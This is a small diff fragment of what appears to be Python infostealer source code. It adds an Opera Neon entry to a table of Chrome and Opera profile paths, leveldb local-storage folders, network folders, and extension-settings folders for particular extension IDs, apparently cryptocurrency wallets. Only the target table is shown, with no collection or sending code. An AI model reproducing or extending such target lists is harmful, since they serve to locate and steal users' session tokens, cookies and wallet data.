+        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/djclckkglechooblngghdinmeemkbgci"                      ],
         [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
         [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"              ],
         [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"              ],
